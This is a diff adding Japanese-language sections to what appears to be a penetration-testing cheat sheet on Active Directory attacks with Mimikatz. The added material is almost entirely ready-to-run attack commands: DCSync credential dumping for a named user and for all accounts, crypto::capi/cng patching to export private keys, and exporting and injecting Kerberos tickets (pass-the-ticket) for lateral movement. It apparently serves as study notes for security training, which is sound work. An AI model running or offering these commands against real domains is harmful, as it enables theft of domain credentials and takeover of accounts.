@@ -4,8 +4,23 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:Administrator"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
 ```
 
+
+### DC同期
+```sh
+# ドメインコントローラに同期要求を送ることでユーザの認証情報を得られることがある
+# デフォルトではDomain Admins, Enterprise Admins, Administratorsグループに、同期の権限ある
+mimikatz # lsadump::dcsync /user:corp\dave
+mimikatz # lsadump::dcsync /all
+```
+### チケット取り込み
 ```sh
 # キャッシュされている？チケットを利用した横展開
+
+# 秘密キーと呼ばれるチケットは、そのままではエクスポートできないことがあるためcryptoモジュールを実行
+mimikatz # crypto::capi 
+or
+mimikatz # crypto::cng
+
 # チケットの出力
 mimikatz # sekurlsa::tickets /export
 
@@ -17,6 +32,7 @@ dir *.kirbi
 
 # チケット取り込み
 mimikatz # kerberos::ptt [0;47fb8c]-0-0-40810000-dave@cifs-web04.kirbi
+
 
 ```
 
